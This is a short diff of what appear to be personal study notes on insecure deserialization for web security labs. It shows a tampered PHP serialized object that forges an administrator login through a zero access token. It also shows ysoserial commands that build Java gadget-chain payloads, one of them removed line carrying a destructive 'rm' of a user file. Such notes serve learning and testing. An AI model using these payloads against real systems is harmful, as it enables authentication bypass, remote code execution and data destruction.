@@ -15,7 +15,7 @@ Change to:
 `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
 
 With ysoserial remember to url encode your generated payload
-`java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64`
+`java -jar /Users/kymb0/toolz/ysoserial-master-d367e379d9-1.jar CommonsCollections4 '/home/shrek/payslip.txt' | base64`
 
 Objects are serialized as:  
 `O:<i>:"<s>":<i>:{<properties>}`  
